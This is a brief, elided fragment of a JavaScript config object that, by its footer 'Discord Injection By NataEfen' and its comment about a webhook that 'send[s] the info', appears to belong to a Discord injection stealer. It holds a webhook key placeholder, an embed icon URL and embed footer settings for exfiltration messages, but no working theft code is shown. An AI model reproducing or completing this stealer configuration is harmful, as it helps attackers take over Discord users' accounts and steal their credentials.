...
const config = {
  ...
  webhook_protector_key: '%WEBHOOK_KEY%', //soon
  ...
  embed_icon: 'https://cdn.discordapp.com/attachments/990707772909817866/991039934318149672/28822.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By NataEfen',
        },
      },
    ],
  };
